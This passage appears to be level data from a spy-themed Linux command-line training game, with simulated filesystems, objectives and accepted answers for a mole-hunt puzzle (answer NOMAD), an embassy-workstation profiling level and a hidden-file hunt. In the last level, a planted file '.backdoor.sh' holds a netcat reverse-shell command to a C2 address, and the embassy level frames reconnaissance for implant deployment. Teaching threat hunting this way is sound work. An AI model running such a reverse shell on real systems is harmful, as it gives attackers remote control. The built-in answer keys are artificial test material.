WARNING: The mole is aware they're being hunted. Work fast.
"Trust no one. Verify everything."`
                },
                '/home/analyst/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'analyst',
                    group: 'analyst',
                    size: 384,
                    content: `cd /evidence
ls -la
cat intel/constraints.txt
cat personnel/operators.txt | head -20
grep "ZONE-ALPHA" personnel/operators.txt
cat operations/ops_inactive.txt
grep "SECTOR-7" operations/zones.txt
grep "NIGHTFALL" operations/assignments.txt
cat personnel/operators.txt | grep "ZONE-ALPHA" | grep -v "ACTIVE"
ls -la /tmp`
                },
                '/home/analyst/.molehunt_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'analyst',
                    group: 'analyst',
                    size: 1024,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║              MOLE HUNT INVESTIGATION CHEATSHEET               ║
╚═══════════════════════════════════════════════════════════════╝

FILTERING DATA
──────────────
grep "PATTERN" file              Find lines matching pattern
grep -v "PATTERN" file           Find lines NOT matching pattern
grep -i "pattern" file           Case-insensitive search

CHAINING COMMANDS (PIPES)
─────────────────────────
cmd1 | cmd2                      Send output of cmd1 to cmd2
grep "A" file | grep "B"         Find lines with BOTH A and B
grep "X" file | grep -v "Y"      Find X but exclude Y

CROSS-REFERENCING
─────────────────
grep "NAME" file1                Find person in file1
grep "OPERATION" file2           Find operation details in file2

SAVING RESULTS
──────────────
grep "pattern" file > output     Save results to file
cat file1 file2 > combined       Combine files

EXAMPLE WORKFLOW
────────────────
# Find operators with ZONE-ALPHA clearance
grep "ZONE-ALPHA" personnel/operators.txt

# Find who was on NIGHTFALL operation
grep "NIGHTFALL" operations/assignments.txt

# Chain: ZONE-ALPHA operators NOT on active ops
grep "ZONE-ALPHA" personnel/operators.txt | grep -v "ACTIVE-OP"

HIDDEN FILES: Use ls -la to find hidden directories!`
                },
                '/home/analyst/workspace': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'analyst',
                    group: 'analyst',
                    children: ['README.txt']
                },
                '/home/analyst/workspace/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'analyst',
                    group: 'analyst',
                    size: 256,
                    content: `WORKSPACE DIRECTORY
===================
Use this directory to save your investigation findings.

Example:
  grep "ZONE-ALPHA" /evidence/personnel/operators.txt > workspace/alpha_cleared.txt
  grep "NIGHTFALL" /evidence/operations/assignments.txt > workspace/nightfall_team.txt`
                },
                '/evidence': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'root',
                    group: 'intel',
                    children: ['personnel', 'operations', 'intel']
                },
                '/evidence/personnel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'root',
                    group: 'intel',
                    children: ['operators.txt', 'clearances.txt']
                },
                '/evidence/personnel/operators.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 4096,
                    content: `FIELD OPERATORS ROSTER - CLASSIFIED
====================================
FORMAT: CODENAME | CLEARANCE | CURRENT-STATUS

APEX        | ZONE-ALPHA | ACTIVE-OP:THUNDER
ARCHER      | ZONE-BETA  | ACTIVE-OP:SENTINEL
ARROW       | ZONE-BETA  | STANDBY
AVALANCHE   | ZONE-GAMMA | ACTIVE-OP:ECLIPSE
BANDIT      | ZONE-DELTA | STANDBY
BISHOP      | ZONE-GAMMA | ACTIVE-OP:HORIZON
BLADE       | ZONE-BETA  | ACTIVE-OP:PHANTOM
BLAZE       | ZONE-BETA  | STANDBY
BOLT        | ZONE-DELTA | ACTIVE-OP:RAPTOR
BRAVO       | ZONE-GAMMA | STANDBY
BULLET      | ZONE-BETA  | ACTIVE-OP:STORM
CASTLE      | ZONE-DELTA | STANDBY
CIPHER      | ZONE-ALPHA | STANDBY
COBRA       | ZONE-DELTA | ACTIVE-OP:VANGUARD
CONDOR      | ZONE-GAMMA | STANDBY
CORONA      | ZONE-ALPHA | ACTIVE-OP:ORACLE
COYOTE      | ZONE-BETA  | STANDBY
CROSS       | ZONE-GAMMA | ACTIVE-OP:SPECTRUM
DAGGER      | ZONE-BETA  | ACTIVE-OP:SENTINEL
DRAGON      | ZONE-GAMMA | STANDBY
EAGLE       | ZONE-ALPHA | ACTIVE-OP:THUNDER
FALCON      | ZONE-BETA  | STANDBY
FANG        | ZONE-DELTA | ACTIVE-OP:AVALANCHE
FROST       | ZONE-BETA  | ACTIVE-OP:ECLIPSE
GHOST       | ZONE-GAMMA | STANDBY
GRIFFIN     | ZONE-GAMMA | ACTIVE-OP:HORIZON
HAWK        | ZONE-ALPHA | ACTIVE-OP:THUNDER
HUNTER      | ZONE-BETA  | STANDBY
HYDRA       | ZONE-GAMMA | ACTIVE-OP:SPECTRUM
JAGUAR      | ZONE-DELTA | STANDBY
KNIGHT      | ZONE-GAMMA | ACTIVE-OP:ORACLE
LANCE       | ZONE-BETA  | STANDBY
LEOPARD     | ZONE-DELTA | ACTIVE-OP:RAPTOR
LION        | ZONE-DELTA | STANDBY
MAVERICK    | ZONE-BETA  | ACTIVE-OP:PHANTOM
MYSTIC      | ZONE-GAMMA | STANDBY
NOMAD       | ZONE-ALPHA | STANDBY
ORACLE      | ZONE-GAMMA | STANDBY
PANTHER     | ZONE-DELTA | ACTIVE-OP:STORM
PHOENIX     | ZONE-GAMMA | STANDBY
PRISM       | ZONE-ALPHA | ACTIVE-OP:SENTINEL
PYTHON      | ZONE-DELTA | STANDBY
RANGER      | ZONE-BETA  | ACTIVE-OP:VANGUARD
RAVEN       | ZONE-BETA  | STANDBY
REAPER      | ZONE-GAMMA | ACTIVE-OP:AVALANCHE
SABER       | ZONE-BETA  | STANDBY
SCOUT       | ZONE-BETA  | ACTIVE-OP:HORIZON
SERPENT     | ZONE-GAMMA | STANDBY
SHADOW      | ZONE-GAMMA | STANDBY
SHARK       | ZONE-DELTA | STANDBY
SIERRA      | ZONE-BETA  | ACTIVE-OP:SPECTRUM
SPECTER     | ZONE-GAMMA | ACTIVE-OP:ORACLE
SPHINX      | ZONE-GAMMA | STANDBY
STORM       | ZONE-BETA  | STANDBY
STRIKER     | ZONE-BETA  | ACTIVE-OP:RAPTOR
TALON       | ZONE-DELTA | ACTIVE-OP:ECLIPSE
TIGER       | ZONE-DELTA | STANDBY
TITAN       | ZONE-ALPHA | ACTIVE-OP:PHANTOM
TRACKER     | ZONE-BETA  | STANDBY
VENOM       | ZONE-DELTA | ACTIVE-OP:THUNDER
VERTEX      | ZONE-ALPHA | ACTIVE-OP:STORM
VIPER       | ZONE-ALPHA | STANDBY
WOLF        | ZONE-ALPHA | ACTIVE-OP:SENTINEL
WRAITH      | ZONE-GAMMA | STANDBY
ZENITH      | ZONE-ALPHA | ACTIVE-OP:VANGUARD

[END OF ROSTER - 65 OPERATORS]`
                },
                '/evidence/personnel/clearances.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 512,
                    content: `SECURITY CLEARANCE LEVELS
=========================

ZONE-ALPHA: Highest clearance. Access to all sectors.
            Can be assigned to any operation worldwide.
            Total operators: 12

ZONE-BETA:  Standard field clearance. Most common.
            Limited to non-critical sectors.
            Total operators: 22

ZONE-GAMMA: Specialist clearance. Technical operations.
            Cyber, signals intelligence, analysis.
            Total operators: 18

ZONE-DELTA: Support clearance. Logistics and backup.
            Cannot lead operations.
            Total operators: 13

NOTE: Only ZONE-ALPHA personnel had access to SECTOR-7 operations.`
                },
                '/evidence/operations': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'root',
                    group: 'intel',
                    children: ['assignments.txt', 'ops_active.txt', 'ops_inactive.txt', 'zones.txt']
                },
                '/evidence/operations/assignments.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 2048,
                    content: `OPERATION ASSIGNMENTS - HISTORICAL RECORD
==========================================
FORMAT: OPERATION | ASSIGNED OPERATORS

NIGHTFALL   | CIPHER, HAWK, NOMAD, PHOENIX, RAVEN, SHADOW, VIPER, WOLF
DARKSTAR    | APEX, DRAGON, FROST, GHOST, MYSTIC, SERPENT
WHISPER     | ARROW, BISHOP, COBRA, GRIFFIN, LANCE, LION
BLACKOUT    | CONDOR, COYOTE, DAGGER, ORACLE, SPHINX, WRAITH
WINTER-SUN  | BANDIT, BLAZE, BRAVO, HUNTER, JAGUAR, STORM
GHOSTLIGHT  | CASTLE, FALCON, PANTHER, PYTHON, SABER, SHARK
COBRA-STRIKE| KNIGHT, LEOPARD, MAVERICK, RANGER, REAPER, TIGER
RAVEN-EYE   | BULLET, CROSS, SCOUT, SIERRA, STRIKER, TRACKER

THUNDER     | APEX, EAGLE, HAWK, VENOM
SENTINEL    | ARCHER, DAGGER, PRISM, WOLF
ECLIPSE     | AVALANCHE, FROST, TALON
PHANTOM     | BLADE, MAVERICK, TITAN
HORIZON     | BISHOP, GRIFFIN, SCOUT
RAPTOR      | BOLT, LEOPARD, STRIKER
STORM       | BULLET, PANTHER, VERTEX
VANGUARD    | COBRA, RANGER, ZENITH
ORACLE      | CORONA, KNIGHT, SPECTER
SPECTRUM    | CROSS, HYDRA, SIERRA
AVALANCHE   | FANG, REAPER

[END OF ASSIGNMENTS]`
                },
                '/evidence/operations/ops_active.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 1024,
                    content: `ACTIVE OPERATIONS
=================
Status: Currently running, personnel deployed

OPERATION    | SECTOR    | STATUS      | TEAM SIZE
─────────────────────────────────────────────────────
THUNDER      | SECTOR-2  | ACTIVE      | 4
SENTINEL     | SECTOR-4  | ACTIVE      | 4
ECLIPSE      | SECTOR-1  | ACTIVE      | 3
PHANTOM      | SECTOR-3  | ACTIVE      | 3
HORIZON      | SECTOR-5  | ACTIVE      | 3
RAPTOR       | SECTOR-2  | ACTIVE      | 3
STORM        | SECTOR-6  | ACTIVE      | 3
VANGUARD     | SECTOR-4  | ACTIVE      | 3
ORACLE       | SECTOR-1  | ACTIVE      | 3
SPECTRUM     | SECTOR-3  | ACTIVE      | 3
AVALANCHE    | SECTOR-5  | ACTIVE      | 2

Total Active Operations: 11
Total Deployed Personnel: 34`
                },
                '/evidence/operations/ops_inactive.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 1536,
                    content: `INACTIVE OPERATIONS
===================
Status: Terminated, compromised, or completed

OPERATION    | SECTOR    | STATUS       | TERMINATION REASON
──────────────────────────────────────────────────────────────
NIGHTFALL    | SECTOR-7  | COMPROMISED  | Intelligence leak - op burned
DARKSTAR     | SECTOR-3  | COMPLETED    | Objectives achieved
WHISPER      | SECTOR-1  | COMPLETED    | Objectives achieved
BLACKOUT     | SECTOR-6  | COMPROMISED  | Cover blown - Loss of assets
WINTER-SUN   | SECTOR-2  | COMPLETED    | Objectives achieved
GHOSTLIGHT   | SECTOR-4  | COMPLETED    | Objectives achieved
COBRA-STRIKE | SECTOR-5  | COMPROMISED  | Ambush - possible leak
RAVEN-EYE    | SECTOR-8  | COMPLETED    | Objectives achieved

*** PRIORITY INVESTIGATION: NIGHTFALL ***
Operation NIGHTFALL in SECTOR-7 was catastrophically compromised.
All assets burned. Enemy had advance warning.
STRONG INDICATION OF INSIDER THREAT.

Total Inactive Operations: 8
Compromised Operations: 3 (NIGHTFALL, BLACKOUT, COBRA-STRIKE)`
                },
                '/evidence/operations/zones.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 1024,
                    content: `OPERATIONAL ZONES - SECTOR ASSIGNMENTS
=======================================

SECTOR-1: Eastern Europe
  - Active: ECLIPSE, ORACLE
  - Inactive: WHISPER (completed)

SECTOR-2: Western Europe
  - Active: THUNDER, RAPTOR
  - Inactive: WINTER-SUN (completed)

SECTOR-3: Middle East
  - Active: PHANTOM, SPECTRUM
  - Inactive: DARKSTAR (completed)

SECTOR-4: Asia Pacific
  - Active: SENTINEL, VANGUARD
  - Inactive: GHOSTLIGHT (completed)

SECTOR-5: Africa
  - Active: HORIZON, AVALANCHE
  - Inactive: COBRA-STRIKE (COMPROMISED)

SECTOR-6: South America
  - Active: STORM
  - Inactive: BLACKOUT (COMPROMISED)

SECTOR-7: North America (RESTRICTED) - Op NIGHTFALL [COMPROMISED]
  - Active: NONE
  - Inactive: NIGHTFALL *** CRITICAL - INVESTIGATE ***

SECTOR-8: Oceania
  - Active: NONE
  - Inactive: RAVEN-EYE (completed)

NOTE: SECTOR-7 operations require ZONE-ALPHA clearance.`
                },
                '/evidence/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'root',
                    group: 'intel',
                    children: ['constraints.txt', 'source_report.txt', 'timeline.txt', '.I_QUIT']
                },
                '/evidence/intel/.I_QUIT': {
                    type: 'dir',
                    perms: 'drwx------',
                    owner: 'analyst',
                    group: 'intel',
                    children: ['notes.txt']
                },
                '/evidence/intel/.I_QUIT/notes.txt': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'analyst',
                    group: 'intel',
                    size: 1024,
                    content: `I QUIT. I'M DONE. THREE WEEKS ON THIS CASE.
=============================================

To whoever picks this up after me:

I've done the work. I've narrowed it down. Here's where I got:

STEP 1: SECTOR-7 operation = NIGHTFALL (compromised)
STEP 2: NIGHTFALL team = 8 operators
STEP 3: Filter by ZONE-ALPHA clearance = 5 remain
STEP 4: Filter by STANDBY (not on active ops) = 3 remain

THE THREE SUSPECTS:
  → CIPHER
  → NOMAD
  → VIPER

One of these three is the traitor. I'M CERTAIN OF IT.

The intercept signature is just "N" but I can't get confirmation
on which one. Cross-reference with the signature and you'll have
your answer. It's RIGHT THERE.

I can't do this anymore. The paranoia is getting to me.
Everyone looks like a suspect now.

Format your report as: SUSPECTS:TRAITOR (alphabetical order)

Good luck. You'll need it.

- Former Analyst Martinez
  (P.S. - Check /tmp if you haven't already. Hidden dead drops.)`
                },
                '/evidence/intel/constraints.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 1024,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║           TRAITOR PROFILE - CONFIRMED CONSTRAINTS             ║
╚═══════════════════════════════════════════════════════════════╝

Source: HUMINT asset CARDINAL (reliability: A+)
Date: 2026-01-15
Classification: TOP SECRET

The traitor matches ALL of the following criteria:

┌─────────────────────────────────────────────────────────────┐
│ CONSTRAINT 1: OPERATION HISTORY                             │
│ The traitor was assigned to an operation that is now        │
│ INACTIVE (compromised or completed).                        │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ CONSTRAINT 2: SECURITY CLEARANCE                            │
│ The traitor has ZONE-ALPHA security clearance.              │
│ (Only 12 operators have this level)                         │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ CONSTRAINT 3: SECTOR INVOLVEMENT                            │
│ The traitor's compromised operation was in SECTOR-7.        │
│ (Check zones.txt for SECTOR-7 operations)                   │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ CONSTRAINT 4: CURRENT STATUS                                │
│ The traitor is NOT currently assigned to any ACTIVE op.     │
│ (Check operators.txt - should show STANDBY, not ACTIVE-OP)  │
└─────────────────────────────────────────────────────────────┘

ANALYSIS APPROACH:
1. Find operation in SECTOR-7 that went INACTIVE
2. Get list of operators assigned to that operation
3. Filter by ZONE-ALPHA clearance
4. Exclude anyone currently on ACTIVE operations
5. Result should be exactly 3 SUSPECTS

Then find the smoking gun to identify the actual traitor.
Check EVERYWHERE. Some evidence may be HIDDEN.`
                },
                '/evidence/intel/source_report.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 768,
                    content: `INTELLIGENCE SOURCE REPORT
==========================
Asset: CARDINAL
Handler: CONTROL
Date: 2026-01-14

CARDINAL reports contact with enemy handler who boasted
about having "a friend in high places" within our organization.

Enemy handler indicated:
- The mole provided advance warning about NIGHTFALL
- The mole has top-tier access (ZONE-ALPHA confirmed)
- The mole is currently "lying low" (not on active operations)
- Communications occur via dead drop in /tmp directory

CARDINAL was unable to obtain the mole's identity directly.
However, the profile constraints should narrow the field
to a small number of suspects.

RECOMMENDATION:
Cross-reference all personnel against the constraints.
Search for hidden communications evidence.

CARDINAL adds: "The walls have ears. The mole knows you're looking."

[END REPORT]`
                },
                '/evidence/intel/timeline.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'intel',
                    size: 512,
                    content: `OPERATION NIGHTFALL - COMPROMISE TIMELINE
==========================================

2026-01-05: NIGHTFALL team inserted into SECTOR-7
2026-01-07: First check-in, all nominal
2026-01-09: Team reports being surveilled
2026-01-10: Safe house compromised, team scattered
2026-01-11: Asset CARDINAL captured (later rescued)
2026-01-12: NIGHTFALL officially terminated
2026-01-13: Counter-intel launched investigation
2026-01-14: CARDINAL provides traitor profile
2026-01-15: YOU ARE HERE - Identify the mole

The enemy knew our moves before we made them.
This was an inside job. Find the traitor.`
                },
                '/tmp': {
                    type: 'dir',
                    perms: 'drwxrwxrwt',
                    owner: 'root',
                    group: 'root',
                    children: ['cache', '.dead_drop']
                },
                '/tmp/cache': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'root',
                    group: 'root',
                    children: ['readme.txt']
                },
                '/tmp/cache/readme.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'root',
                    size: 64,
                    content: `System cache directory. Nothing interesting here.`
                },
                '/tmp/.dead_drop': {
                    type: 'dir',
                    perms: 'drwx------',
                    owner: 'root',
                    group: 'root',
                    children: ['intercept.log']
                },
                '/tmp/.dead_drop/intercept.log': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'root',
                    group: 'root',
                    size: 1024,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║        INTERCEPTED COMMUNICATIONS - TOP SECRET                ║
╚═══════════════════════════════════════════════════════════════╝

SIGINT INTERCEPT #4471
Date: 2026-01-09 03:42:17 UTC
Frequency: Encrypted burst transmission
Decryption: PARTIAL

───────────────────────────────────────────────────────────────
FROM: [INTERNAL - COUNTER-INTEL TRACE CONFIRMS OUR NETWORK]
TO: ENEMY HANDLER (codename: ROOK)
───────────────────────────────────────────────────────────────

ROOK,

NIGHTFALL team arriving at waypoint BRAVO tomorrow 0600.
Suggest interdiction at grid reference [REDACTED].
Payment as agreed. CARDINAL is the priority target.

The others suspect nothing. They trust me completely.

Will go dark after this. Too much heat.
Contact via usual dead drop when clear.

- N

───────────────────────────────────────────────────────────────
ANALYSIS: Signature "N" consistent with single letter codename
initial. Cross-reference with NIGHTFALL team roster.
PROBABLE TRAITOR: Codename begins with "N"
───────────────────────────────────────────────────────────────

[END INTERCEPT]`
                },
            },

            // OUTCOME-BASED OBJECTIVES - check what they FOUND, not how they found it
            objectives: [
                {
                    id: 1,
                    task: 'Identify the compromised SECTOR-7 operation',
                    hint: 'Which operation in SECTOR-7 was compromised?',
                    check: (cmd, state, output) => output && output.includes('NIGHTFALL')
                },
                {
                    id: 2,
                    task: 'Obtain the NIGHTFALL team roster',
                    hint: 'Who was assigned to Operation NIGHTFALL?',
                    check: (cmd, state, output) => output && output.includes('CIPHER') && output.includes('NOMAD') && output.includes('VIPER')
                },
                {
                    id: 3,
                    task: 'Narrow to ZONE-ALPHA operators on STANDBY',
                    hint: 'Cross-reference clearance level with current status',
                    check: (cmd, state, output) => output && output.includes('ZONE-ALPHA') && output.includes('STANDBY')
                },
                {
                    id: 4,
                    task: 'Locate the hidden dead drop',
                    hint: 'Field operatives sometimes leave evidence in unexpected places',
                    check: (cmd, state, output) => output && output.includes('.dead_drop')
                },
                {
                    id: 5,
                    task: 'Recover the smoking gun evidence',
                    hint: 'The intercepted communication reveals the traitor\'s signature',
                    check: (cmd, state, output) => output && output.includes('- N')
                },
            ],

            // Insight Phase - Compounded Answer
            insightPhase: {
                enabled: true,
                question: "Enter your findings in format: SUSPECT1,SUSPECT2,SUSPECT3:TRAITOR (suspects alphabetical)",
                acceptedAnswers: [
                    "CIPHER,NOMAD,VIPER:NOMAD",
                    "cipher,nomad,viper:nomad",
                    "CIPHER, NOMAD, VIPER:NOMAD",
                    "CIPHER,NOMAD,VIPER: NOMAD",
                    "CIPHER, NOMAD, VIPER: NOMAD"
                ],
                hint: "NIGHTFALL team + ZONE-ALPHA + STANDBY = 3 suspects. The intercept signature reveals which one.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Analysis incomplete. Cross-reference all constraints and find the smoking gun.",
                correctAnswerMessage: "TRAITOR CONFIRMED: NOMAD. Counter-intel team dispatched. Outstanding work, analyst."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-016: System Intel
        // Theme: Embassy workstation profiling before implant deployment
        // ──────────────────────────────────────────────────────────
        'CLH-016': {
            title: 'System Intel',
            description: 'Profile a compromised embassy workstation before deploying collection tools.',
            prerequisites: ['CLH-015'],
            tier: 'CLI Specter',
            user: 'operator',
            hostname: 'EMBASSY-WS-07',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['.ssh', 'intel', 'tools', '.bashrc', '.bash_history', '.sysinfo_cheatsheet']
                },
                '/home/operator/.ssh': {
                    type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
                    children: ['id_rsa', 'id_rsa.pub', 'known_hosts']
                },
                '/home/operator/.ssh/id_rsa': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 1675,
                    content: '-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED - OPERATIONAL KEY]\n-----END OPENSSH PRIVATE KEY-----'
                },
                '/home/operator/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 78,
                    content: `uname -a
lscpu
free -h
df -h
du -sh /home`
                },
                '/home/operator/.sysinfo_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          SYSTEM PROFILING CHEATSHEET                          ║
╚═══════════════════════════════════════════════════════════════╝

ARCHITECTURE INFO
────────────────
uname -a             Full system info
uname -r             Kernel version
arch                 CPU architecture
hostnamectl          System/OS details

CPU PROFILING
────────────
lscpu                CPU architecture info
nproc                Number of processors
cat /proc/cpuinfo    Detailed CPU info

MEMORY ASSESSMENT
────────────────
free -h              Human-readable memory
cat /proc/meminfo    Detailed memory info
vmstat               Virtual memory stats

DISK ANALYSIS
────────────
df -h                Filesystem space
du -sh /path         Directory size
lsblk                Block devices
fdisk -l             Disk partitions`
                },
                '/home/operator/intel': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['notes.txt', 'targets.list']
                },
                '/home/operator/intel/notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
                    content: 'OPERATION IRON HARVEST\n======================\nTarget: Embassy IT Admin Workstation\nAccess: SSH key compromise\nObjective: Profile system for implant deployment\n'
                },
                '/home/operator/intel/targets.list': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 189,
                    content: `HIGH VALUE TARGETS
==================
/home/ambassador/.classified/
/data/diplomatic-cables/
/data/backups/

SECONDARY TARGETS
=================
/home/attache/reports/
/home/attache/schedules/`
                },
                '/home/operator/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['recon.sh', 'exfil.py']
                },
                '/home/operator/tools/recon.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'operator', group: 'operator', size: 256,
                    content: `#!/bin/bash
# System profiling script
echo "=== SYSTEM PROFILE ==="
uname -a
echo "=== CPU ==="
lscpu | head -5
echo "=== MEMORY ==="
free -h
echo "=== DISK ==="
df -h`
                },
                '/home/ambassador': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'ambassador', group: 'ambassador',
                    children: ['documents', 'emails', '.classified']
                },
                '/home/ambassador/.classified': {
                    type: 'dir', perms: 'drwx------', owner: 'ambassador', group: 'ambassador',
                    children: ['MAJESTIC-12.pdf', 'TREATY-DRAFT.doc', 'ASSET-LIST.xlsx']
                },
                '/home/attache': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'attache', group: 'attache',
                    children: ['reports', 'schedules']
                },
                '/data': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['backups', 'archives', 'diplomatic-cables']
                },
                '/data/diplomatic-cables': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'staff',
                    children: ['2024-Q1', '2024-Q2', '2024-Q3', '2024-Q4']
                },
            },

            objectives: [
                { id: 1, task: 'IDENTIFY: System Architecture', hint: '$ uname -a',
                  check: (cmd, state, output) => cmd.includes('uname') && output && output.includes('Linux') },
                { id: 2, task: 'PROFILE: CPU Capabilities', hint: '$ lscpu',
                  check: (cmd, state, output) => cmd.includes('lscpu') && output && output.includes('CPU') },
                { id: 3, task: 'ASSESS: Memory Resources', hint: '$ free -h',
                  check: (cmd, state, output) => cmd.includes('free') && output && output.includes('Mem') },
                { id: 4, task: 'ANALYZE: Disk Space', hint: '$ df -h',
                  check: (cmd, state, output) => cmd.includes('df') && output && output.includes('Filesystem') },
                { id: 5, task: 'ESTIMATE: Target Directory Size', hint: '$ du -sh /home',
                  check: (cmd, state, output) => cmd.includes('du') && cmd.includes('/home') && output && /\d/.test(output) },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "What is the operation codename according to the intel notes?",
                acceptedAnswers: ["iron harvest", "operation iron harvest", "ironharvest"],
                hint: "Check the notes.txt file in the intel directory.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Codename not recognized. Review intel/notes.txt for mission details.",
                correctAnswerMessage: "OPERATION IRON HARVEST confirmed. Implant deployment authorized."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-017: Find & Locate
        // Theme: Mole hunt - finding hidden files and backdoors
        // ──────────────────────────────────────────────────────────
        'CLH-017': {
            title: 'Find & Locate',
            description: 'Hunt for trojans and hidden files planted by a mole on a compromised system.',
            prerequisites: ['CLH-016'],
            tier: 'CLI Specter',
            user: 'hunter',
            hostname: 'BLACKSITE-7',
            startDir: '/home/hunter',
            allowedCommands: null,

            filesystem: {
                '/home/hunter': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'hunter', group: 'hunter',
                    children: ['toolkit', 'reports', '.bashrc', '.bash_history', '.find_cheatsheet']
                },
                '/home/hunter/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'hunter', group: 'hunter', size: 156,
                    content: `find /home -name ".*" -type f
find / -perm -4000 2>/dev/null
find /tmp -type f
find / -mtime -1 -type f 2>/dev/null
which sudo`
                },
                '/home/hunter/.find_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'hunter', group: 'hunter', size: 678,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          FILE HUNTING CHEATSHEET                              ║
╚═══════════════════════════════════════════════════════════════╝

FIND BY NAME
────────────
find /path -name "filename"       Exact match
find /path -name "*.log"          Wildcard match
find /path -name ".*"             Hidden files (dot files)
find /path -iname "file"          Case-insensitive

FIND BY TYPE
───────────
find /path -type f                Regular files only
find /path -type d                Directories only
find /path -type l                Symbolic links

FIND BY PERMISSIONS
──────────────────
find / -perm -4000                SUID files (priv esc)
find / -perm -2000                SGID files
find / -perm -o+w                 World-writable files

FIND BY TIME
───────────
find / -mtime -1                  Modified in last 24h
find / -mtime +30                 Modified 30+ days ago
find / -atime -7                  Accessed in last week
find / -newer /etc/passwd         Newer than reference file

LOCATE (Fast Index Search)
─────────────────────────
locate filename                   Search index
whereis command                   Find binary/man pages
which command                     Find executable path`
                },
                '/home/hunter/toolkit': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'hunter', group: 'hunter',
                    children: ['scanner.sh', 'hasher.py']
                },
                '/home/hunter/toolkit/scanner.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'hunter', group: 'hunter', size: 256,
                    content: `#!/bin/bash
# Threat hunting scanner
echo "=== SUID FILES ==="
find / -perm -4000 2>/dev/null
echo "=== HIDDEN FILES ==="
find /home -name ".*" -type f
echo "=== RECENT CHANGES ==="
find / -mtime -1 -type f 2>/dev/null`
                },
                '/home/hunter/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'hunter', group: 'hunter',
                    children: ['README.txt']
                },
                '/home/hunter/reports/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'hunter', group: 'hunter', size: 89,
                    content: 'Save your threat findings here.\nExample: find /tmp -type f > reports/tmp_files.txt'
                },
                '/home/analyst': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['.bashrc', '.secret_keys', '.backdoor.sh', '.classified']
                },
                '/home/analyst/.secret_keys': {
                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst', size: 512,
                    content: '[SUSPICIOUS] API keys and credentials stored in hidden file'
                },
                '/home/analyst/.backdoor.sh': {
                    type: 'file', perms: '-rwx------', owner: 'analyst', group: 'analyst', size: 1024,
                    content: '#!/bin/bash\n# TROJAN - Reverse shell to mole C2\nnc -e /bin/bash 10.0.0.88 4444'
                },
                '/home/mole': {
                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
                    children: ['.exfil_staging', '.local']
                },
                '/home/mole/.exfil_staging': {
